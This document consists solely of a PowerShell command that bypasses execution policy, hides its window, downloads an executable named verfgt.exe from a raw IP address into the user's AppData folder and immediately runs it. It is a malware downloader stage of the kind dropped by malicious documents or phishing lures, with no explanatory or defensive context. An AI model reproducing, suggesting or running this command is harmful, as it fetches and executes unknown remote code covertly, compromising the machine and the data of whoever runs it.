
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94.135/~harvy/verfgt.exe', $env:APPDATA\verfgt.exe );Start-Process ( $env:APPDATA\verfgt.exe )

